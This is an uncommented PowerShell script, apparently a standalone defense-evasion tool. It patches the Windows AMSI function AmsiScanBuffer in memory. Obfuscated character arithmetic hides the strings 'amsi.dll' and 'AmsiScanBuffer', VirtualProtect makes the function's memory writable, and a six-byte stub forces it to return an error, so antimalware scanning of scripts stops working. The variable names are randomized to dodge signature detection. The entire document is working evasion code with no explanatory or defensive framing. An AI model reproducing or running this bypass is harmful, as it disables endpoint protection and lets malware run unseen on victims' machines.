$_jBD2Prrn = @"
using System;
using System.Runtime.InteropServices;
public class _jBD2Prrn {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr C_xUR, string DaQv83eGfq);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Gr9HCob2iHKv, UIntPtr Eq5GNi_YCgrY, uint IzkC9x4pCmKK_zIagaw, out uint a4CUY0IWKfaeS5p_8c);
}
"@

Add-Type $_jBD2Prrn

$P1cV = [_jBD2Prrn]::LoadLibrary("$([cHAr]([bytE]0x61)+[CHAR]([bYte]0x6d)+[cHAr]([bYte]0x73)+[cHAr](105+86-86)+[char]([byte]0x2e)+[cHAr](100)+[cHAr](108)+[CHAR]([BYTE]0x6c))")
$frBErvFQt7d6GvBu = [_jBD2Prrn]::GetProcAddress($P1cV, "$(('ÄmsíScánB'+'ùffèr').NOrMalizE([ChaR](70*37/37)+[chaR](111+5-5)+[ChaR](114*40/40)+[ChAr](109)+[cHaR](22+46)) -replace [cHAr](83+9)+[chAr]([ByTE]0x70)+[CHaR]([byTe]0x7b)+[CHaR]([byte]0x4d)+[chAR](110+23-23)+[CHAR]([ByTe]0x7d))")
$p = 0
[_jBD2Prrn]::VirtualProtect($frBErvFQt7d6GvBu, [uint32]5, 0x40, [ref]$p)
$cy6SvjbcvR = "0xB8"
$tsjBNQM2vGNg = "0x57"
$VEz6gczO0rwrTl7i = "0x00"
$yCczu_Dxfh = "0x07"
$zk1uceLzl_J57X = "0x80"
$ne8HH7H = "0xC3"
$olhcaPIxixV4gOy5kNZ = [Byte[]] ($cy6SvjbcvR,$tsjBNQM2vGNg,$VEz6gczO0rwrTl7i,$yCczu_Dxfh,+$zk1uceLzl_J57X,+$ne8HH7H)
[System.Runtime.InteropServices.Marshal]::Copy($olhcaPIxixV4gOy5kNZ, 0, $frBErvFQt7d6GvBu, 6)